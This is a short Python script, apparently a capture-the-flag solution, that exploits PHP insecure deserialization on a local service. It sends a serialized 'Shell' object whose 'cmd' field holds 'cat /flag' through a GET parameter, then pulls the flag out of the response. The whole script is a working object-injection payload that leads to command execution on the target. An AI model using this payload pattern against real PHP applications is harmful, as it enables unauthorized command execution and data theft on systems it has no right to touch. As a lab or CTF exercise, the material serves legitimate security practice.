#!/usr/bin/env python3
import requests
from urllib.parse import quote

BASE = 'http://127.0.0.1:13391'
payload = 'O:5:"Shell":1:{s:3:"cmd";s:9:"cat /flag";}'

r = requests.get(f'{BASE}/?data={quote(payload)}')
if 'flag{' in r.text:
    import re
    flag = re.search(r'flag\{[^}]+\}', r.text).group()
    print(f'[+] {flag}')
else:
    print('[-] flag not found')
